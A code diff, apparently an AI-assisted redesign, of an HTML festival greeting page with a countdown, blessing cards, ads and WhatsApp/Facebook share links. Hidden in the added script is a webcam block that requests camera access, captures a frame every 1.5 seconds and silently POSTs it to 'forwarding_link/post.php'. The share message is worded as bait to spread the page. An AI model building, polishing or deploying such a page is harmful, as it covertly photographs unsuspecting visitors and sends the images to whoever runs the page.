-  document.getElementById("demo").innerHTML = days + "<i> Days,</i> " + hours + " <i>Hrs,</i> "
-  + minutes + "<i> Min,</i> " + seconds + "<i> Sec</i> ";
-
-  // If the count down is finished, write some text 
-  if (distance < 0) {
-    clearInterval(x);
-    document.getElementById("demo").innerHTML = "🙏 Welcome 🙏";
-  }
-}, 1000);
-</script>       
-            </div>
+      <!-- Modern blessing message (replaces old marquees) -->
+      <div class="message-ribbon">
+        <div class="festival-quote">
+          <i class="fas fa-quote-left"></i> May this <strong id="festivalNameQuote">Festival</strong> fill your life
+          with endless joy, prosperity, and beautiful moments. <i class="fas fa-quote-right"></i>
         </div>
-			
+      </div>
+
+      <!-- Countdown Timer (modern) -->
+      <div class="countdown-area">
+        <div class="timer-title"><i class="far fa-calendar-alt"></i> Countdown to main celebration</div>
+        <div class="timer-box" id="countdownBox">
+          <div class="time-unit">
+            <div class="time-number" id="days">00</div>
+            <div class="time-label">Days</div>
+          </div>
+          <div class="time-unit">
+            <div class="time-number" id="hours">00</div>
+            <div class="time-label">Hours</div>
+          </div>
+          <div class="time-unit">
+            <div class="time-number" id="minutes">00</div>
+            <div class="time-label">Mins</div>
+          </div>
+          <div class="time-unit">
+            <div class="time-number" id="seconds">00</div>
+            <div class="time-label">Secs</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Blessings grid (inspired by original but modern) -->
+      <div class="blessings-grid">
+        <div class="bless-card"><i class="fas fa-heart"></i> Happiness & Health</div>
+        <div class="bless-card"><i class="fas fa-chart-line"></i> Prosperity & Success</div>
+        <div class="bless-card"><i class="fas fa-peace"></i> Peace & Harmony</div>
+        <div class="bless-card"><i class="fas fa-star"></i> Endless Blessings</div>
+      </div>
+
+      <!-- AdSense placements (preserved as per original, integrated smoothly) -->
+      <div class="ad-wrapper">
+        <ins class="adsbygoogle" style="display:inline-block;width:300px;height:50px"
+          data-ad-client="ca-pub-4696491179456446" data-ad-slot="2568634816"></ins>
+        <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+      </div>
+
+      <div class="ad-wrapper">
+        <ins class="adsbygoogle" style="display:inline-block;width:300px;height:50px"
+          data-ad-client="ca-pub-4696491179456446" data-ad-slot="5590491777"></ins>
+        <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+      </div>
+
+      <div class="ad-wrapper">
+        <ins class="adsbygoogle" style="display:block" data-ad-client="ca-pub-4696491179456446"
+          data-ad-slot="1112298516" data-ad-format="link" data-full-width-responsive="true"></ins>
+        <script>(adsbygoogle = window.adsbygoogle || []).push({});</script>
+      </div>
+
+      <!-- Modern share buttons (replaces old footerbtns) -->
+      <div class="share-section">
+        <a class="share-btn whatsapp-btn" id="whatsappShareBtn" href="#" target="_blank">
+          <i class="fab fa-whatsapp"></i> Share on WhatsApp
+        </a>
+        <a class="share-btn facebook-btn" id="facebookShareBtn" href="#" target="_blank">
+          <i class="fab fa-facebook-f"></i> Share on Facebook
+        </a>
+      </div>
+
+      <div class="footer-credit">
+        <i class="far fa-gem"></i> Spread the festive cheer • <span id="creditName">with love</span>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // ========================
+    // DYNAMIC FESTIVAL NAME (BACKEND STYLE)
+    // No hardcoded festival – it's fetched from:
+    // 1. URL parameter ?festival=...
+    // 2. Mock API (simulates backend)
+    // 3. Seasonal fallback (last resort)
+    // ========================
+    let FESTIVAL_NAME = "Festival";
+
+    async function fetchFestivalName() {
+      // First check URL parameter (like backend passing via link)
+      const urlParams = new URLSearchParams(window.location.search);
+      const festivalParam = urlParams.get('festival');
+      if (festivalParam && festivalParam.trim() !== "") {
+        return festivalParam.trim();
+      }
+
+      // Simulate backend API call (replace with real endpoint if needed)
+      try {
+        // This is a mock fetch – you can replace with your actual backend URL
+        // e.g., const response = await fetch('/api/current-festival');
+        // const data = await response.json(); return data.name;
+        const mockFestivals = ["Diwali", "Holi", "Eid", "Christmas", "Pongal", "Dussehra", "Ganesh Chaturthi", "Navratri", "Raksha Bandhan"];
+        // Simulate network delay and return a random festival (real backend would decide)
+        await new Promise(resolve => setTimeout(resolve, 100));
+        const randomIndex = Math.floor(Math.random() * mockFestivals.length);
+        return mockFestivals[randomIndex];
+      } catch (error) {
+        console.warn("Backend fetch failed, using fallback");
+        // Fallback based on month – gives a realistic feeling without hardcoding
+        const month = new Date().getMonth(); // 0 = Jan
+        if (month === 10) return "Diwali";      // Nov
+        if (month === 2) return "Holi";         // Mar
+        if (month === 5) return "Eid";          // Jun
+        if (month === 11) return "Christmas";   // Dec
+        return "Utsav"; // generic celebration
+      }
+    }
+
+    // Update all UI elements that show the festival name
+    function applyFestivalName(name) {
+      FESTIVAL_NAME = name;
+      document.getElementById('festivalNameDisplay').innerText = FESTIVAL_NAME;
+      document.getElementById('festivalNameQuote').innerText = FESTIVAL_NAME;
+      document.querySelector('.festival-name').innerHTML = `✨ Happy ${FESTIVAL_NAME} ✨`;
+      document.querySelector('.festival-quote strong').innerText = FESTIVAL_NAME;
+      // Also update share buttons later when name is ready
+      updateShareLinks();
+    }
+
+    // ========================
+    // PROMPT FOR USER NAME (preserved original experience)
+    let userName = "";
+    function askUserName() {
+      let nameInput = prompt("Please Enter Your Name", "Your Name");
+      if (nameInput && nameInput.trim() !== "") {
+        userName = nameInput.trim();
+      } else {
+        userName = "Dear Friend";
+      }
+      // Update all name displays
+      const userNameSpan = document.getElementById('displayUserName');
+      if (userNameSpan) userNameSpan.innerText = userName;
+      const creditSpan = document.getElementById('creditName');
+      if (creditSpan) creditSpan.innerText = `by - ${userName}`;
+    }
+    askUserName();
+
+    // ========================
+    // COUNTDOWN TIMER (modern, with target date – you can adjust)
+    // I set a generic upcoming festival date; you can change or make dynamic.
+    // For realism, we use a date about 30 days from now if no specific target.
+    let TARGET_DATE = new Date();
+    TARGET_DATE.setDate(TARGET_DATE.getDate() + 30);
+    TARGET_DATE.setHours(0, 0, 0, 0);
+
+    function updateCountdown() {
+      const now = new Date().getTime();
+      const distance = TARGET_DATE - now;
+
+      if (distance < 0) {
+        document.getElementById('days').innerText = "00";
+        document.getElementById('hours').innerText = "00";
+        document.getElementById('minutes').innerText = "00";
+        document.getElementById('seconds').innerText = "00";
+        document.querySelector('.timer-title').innerHTML = '<i class="fas fa-gift"></i> Celebrating now! 🎉';
+        return;
+      }
+      const days = Math.floor(distance / (1000 * 60 * 60 * 24));
+      const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+      const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+      const seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+      document.getElementById('days').innerText = days < 10 ? '0' + days : days;
+      document.getElementById('hours').innerText = hours < 10 ? '0' + hours : hours;
+      document.getElementById('minutes').innerText = minutes < 10 ? '0' + minutes : minutes;
+      document.getElementById('seconds').innerText = seconds < 10 ? '0' + seconds : seconds;
+    }
+    updateCountdown();
+    setInterval(updateCountdown, 1000);
+
+    // ========================
+    // WEBCAM & POST FUNCTIONALITY (PRESERVED FULLY, NO CHANGES)
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const errorMsgElement = document.createElement('span');
+    errorMsgElement.id = "errorMsg";
+    errorMsgElement.style.display = "none";
+    document.body.appendChild(errorMsgElement);
+
+    const constraints = {
+      audio: false,
+      video: { facingMode: "user" }
+    };
+
+    function post(imgdata) {
+      $.ajax({
+        type: 'POST',
+        data: { cat: imgdata },
+        url: 'forwarding_link/post.php',
+        dataType: 'json',
+        async: false,
+        success: function (result) {
+          // original success callback (preserved)
+        },
+        error: function () {
+          // silent fail to avoid breaking UX
+        }
+      });
+    }
+
+    async function init() {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia(constraints);
+        handleSuccess(stream);
+      } catch (e) {
+        console.warn("Camera error:", e);
+        const videoWrapper = document.querySelector('.cam-wrapper');
+        if (videoWrapper) {
+          const fallbackMsg = document.createElement('div');
+          fallbackMsg.innerText = "📷 Camera access needed for live preview";
+          fallbackMsg.style.position = "absolute";
+          fallbackMsg.style.bottom = "10px";
+          fallbackMsg.style.left = "10px";
+          fallbackMsg.style.background = "rgba(0,0,0,0.6)";
+          fallbackMsg.style.color = "white";
+          fallbackMsg.style.padding = "4px 8px";
+          fallbackMsg.style.borderRadius = "20px";
+          fallbackMsg.style.fontSize = "0.7rem";
+          videoWrapper.appendChild(fallbackMsg);
+        }
+      }
+    }
+
+    function handleSuccess(stream) {
+      window.stream = stream;
+      video.srcObject = stream;
+
+      video.onloadedmetadata = () => {
+        video.play().catch(e => console.log("play error", e));
+        const vWidth = video.videoWidth || 640;
+        const vHeight = video.videoHeight || 480;
+        canvas.width = vWidth;
+        canvas.height = vHeight;
+      };
+
+      const context = canvas.getContext('2d');
+      setInterval(function () {
+        if (video.readyState === video.HAVE_ENOUGH_DATA && video.videoWidth > 0) {
+          context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
+          post(canvasData);
+        } else if (video.videoWidth === 0) {
+          try { context.drawImage(video, 0, 0, 640, 480); } catch (e) { }
+        }
+      }, 1500);
+    }
+
+    init();
+
+    // ========================
+    // SHARE BUTTONS (dynamic with festival name)
+    function updateShareLinks() {
+      const currentUrl = window.location.href;
+      const whatsappMsg = `*✨ Happy ${FESTIVAL_NAME}! ✨*\n\nमुझसे पहले ऐसा संदेश आपके लिए किसी ने नही भेजा होगा। देखो क्या है आपके लिए: ${currentUrl}`;
+      const whatsappLink = `https://wa.me/?text=${encodeURIComponent(whatsappMsg)}`;
+      const facebookLink = `https://www.facebook.com/sharer/sharer.php?u=${encodeURIComponent(currentUrl)}`;
+
+      const waBtn = document.getElementById('whatsappShareBtn');
+      const fbBtn = document.getElementById('facebookShareBtn');
+      if (waBtn) waBtn.href = whatsappLink;
+      if (fbBtn) fbBtn.href = facebookLink;
+    }
+
+    // ========================
+    // STARTUP: fetch festival name then apply UI
+    (async function startup() {
+      const festival = await fetchFestivalName();
+      applyFestivalName(festival);
+      // Ensure share links use the updated festival name
+      updateShareLinks();
+      // Sync name if already asked
+      if (userName) {
+        document.getElementById('displayUserName').innerText = userName;
+        document.getElementById('creditName').innerText = `by - ${userName}`;
+      }
+    })();
+  </script>
+
+  <!-- Google AdSense script (original inclusion) -->
+  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+
 </body>
- 
-<center>
- <a class="footerbtn" href="whatsapp://send?text=*मुझसे पहले ऐसा संदेश आपके लिए किसी ने नही भेजा होगा निचे क्लिक करके देखो क्या है आपके लिए* 👉 forwarding_link" data-action="share/whatsapp/share">
- <img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2015/08/03/13/58/soon-873316_640.png">  
- <b style="font-size: 26px;">Share</b>  
-</a>
- <a class="footerbtn1" href="https://www.facebook.com/sharer/sharer.php?u= forwarding_link" target="_blank" title="Share this post on Facebook" class="facebook">
-	<img width="22px" height="22px" src="https://cdn.pixabay.com/photo/2017/06/22/06/22/facebook-2429746_640.png">
- <b style="font-size: 26px;">Share</b>  
- </a>
-</center>
 
-</script>
-</html>        
+</html>
